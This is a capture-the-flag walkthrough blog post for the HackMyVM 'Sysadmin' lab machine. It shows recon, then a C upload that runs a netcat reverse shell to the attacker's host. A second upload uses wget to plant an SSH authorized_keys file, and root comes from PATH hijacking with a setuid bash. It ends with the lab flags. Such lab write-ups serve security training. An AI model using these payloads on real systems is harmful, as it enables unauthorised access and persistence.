---
title: Sysadmin
author: VoidReign-U
date: 2025-10-28 00:00:00 +0800
categories:
  - Training platform
  - HackMyVm
tags:
  - HackMyVm
  - Easy
  - web
permalink: /HackMyVm/Sysadmin.html
---

<img src="/assets/img/Sysadmin/vm.png" alt="image-machine" />

## Recon

### Port Scanning
```bash
❯ rustscan -a 192.168.1.102
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I don't always scan ports, but when I do, I prefer RustScan.

[~] The config file is expected to be at "/home/v01d/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.1.102:22
Open 192.168.1.102:80
[~] Starting Script(s)
[~] Starting Nmap 7.98 ( https://nmap.org ) at 2025-10-28 17:01 +0200
Initiating Ping Scan at 17:01
Scanning 192.168.1.102 [2 ports]
Completed Ping Scan at 17:01, 0.00s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:01
Completed Parallel DNS resolution of 1 host. at 17:01, 0.50s elapsed
DNS resolution of 1 IPs took 0.50s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 17:01
Scanning 192.168.1.102 [2 ports]
Discovered open port 80/tcp on 192.168.1.102
Discovered open port 22/tcp on 192.168.1.102
Completed Connect Scan at 17:01, 0.00s elapsed (2 total ports)
Nmap scan report for 192.168.1.102
Host is up, received syn-ack (0.00019s latency).
Scanned at 2025-10-28 17:01:47 EET for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```


### i found to ports 22 for ssh and 80 for http


<img src="/assets/img/Sysadmin/pic.png" alt="image-machine" />


### The page allows uploading C files, and by inspecting the compile command, it is clear that standard headers like `stdio.h` or `stdlib.h` cannot be used. However, functions from libraries can still be used if their prototypes are defined manually and the program is linked with the library, or system calls can be used directly to perform operations without relying on any library.

# Compile environment (concise)

Observed compile command:
```bash
gcc -std=c11 -nostdinc -I/var/www/include -z execstack -fno-stack-protector -no-pie test.c -o a.out
```

**Key points**

- `-nostdinc` disables standard header search (`/usr/include`), so `stdio.h`/`stdlib.h` are unavailable by default.
    
- You can still use libc functions if you **manually declare prototypes** and **link libc** (e.g. `-lc`), or you can avoid libc entirely by using `_start` + direct syscalls and compiling with `-nostdlib`.
    
- Flags like `-z execstack`, `-fno-stack-protector`, and `-no-pie` weaken runtime protections (used for testing/exploit dev), do not use in production.
    

**One-line examples**

- Use libc without headers:
    

`int printf(const char *fmt, ...);`

Compile: `gcc ... test.c -o a.out -lc`

- No libc (syscall entry):
    

`void _start(){ /* syscall write/exit */ }`

```c
int system(const char *command);

```
### for that i upload this

```c
int system(const char *command);
int main() {
    system("busybox nc 192.168.1.101 9001 -e /bin/bash"); 
    return 0;
}
```
### i found the user 
```bash
❯ nc -lnvp 9001                                                                                                                               
Listening on 0.0.0.0 9001                                               
id                                              
Connection received on 192.168.1.102 57128                                                                                                                                                                          
uid=1000(echo) gid=1000(echo) groups=1000(echo)
```
### Now The Reverse Shell

#### I tried to run a reverse shell, but the connection stopped after about two seconds. Since I now know the user, I can upload my public SSH key to that user’s home at `/home/echo/.ssh/authorized_keys`.


```
int system(const char *command);
int main() {
    system("mkdir -p ~/.ssh && busybox wget http://192.168.1.101:8000/authorized_keys -O ~/.ssh/authorized_keys "); 
    return 0;
}

```

## Prive Esc

### ssh for echo

```

❯ ssh -l echo 192.168.1.102 -i ~/.ssh/id_ed25519
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Linux Sysadmin 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Oct 28 11:37:19 2025 from 192.168.1.101
echo@Sysadmin:~$ 
```

### first thing try sudo -l

```bash

echo@Sysadmin:~$ sudo -l
Matching Defaults entries for echo on Sysadmin:
    !env_reset, mail_badpass, !env_reset, always_set_home

User echo may run the following commands on Sysadmin:
    (root) NOPASSWD: /usr/local/bin/system-info.sh
echo@Sysadmin:~$ ls -la /usr/local/bin/
total 16
drwxr-xr-x  2 root root 4096 Aug 14 11:07 .
drwxr-xr-x 10 root root 4096 Mar 18  2025 ..
-rwxr-xr-x  1 root root  313 Aug 14 11:07 compile_and_run.sh
-rwxr-xr-x  1 root root  650 Aug 14 09:32 system-info.sh
echo@Sysadmin:~$ ls -lad /usr/local/bin/
drwxr-xr-x 2 root root 4096 Aug 14 11:07 /usr/local/bin/
echo@Sysadmin:~$ cat /usr/local/bin/system-info.sh
#!/bin/bash

#===================================
# Daily System Info Report
#===================================

echo "Starting daily system information collection at $(date)"
echo "------------------------------------------------------"

echo "Checking disk usage..."
df -h

echo "Checking log directory..."
ls -lh /var/log/
find /var/log/ -type f -name "*.gz" -mtime +30 -exec rm {} \;

echo "Checking critical services..."
systemctl is-active sshd
systemctl is-active cron

echo "Collecting CPU and memory information..."
cat /proc/cpuinfo
free -m

echo "------------------------------------------------------"
echo "Report complete at $(date)"
echo@Sysadmin:~$ 

```

### I can run `/usr/local/bin/system-info.sh` with root privilege. I can't modify the script or its directory, but the script calls tools like `free`, `cat`, `systemctl`, `ls`, and `df` without absolute paths — that means PATH hijacking is possible.

```
echo@Sysadmin:~$ echo "chmod +s /bin/bash" > /tmp/free                                                                                   
echo@Sysadmin:~$ export PATH=/tmp:$PATH

echo@Sysadmin:~$ sudo -u root /usr/local/bin/system-info.sh 

echo@Sysadmin:~$ bash -p

bash-5.0# 

```

## Flags

```bash

bash-5.0# cat /root/root.txt 

flag{root-8b8a8b353298f798e3eb8628661617b6}

bash-5.0# cat /home/echo/user.txt 

flag{user-9592f6e02a7abaf9e38c0ef43e868cf3}

bash-5.0# 

```
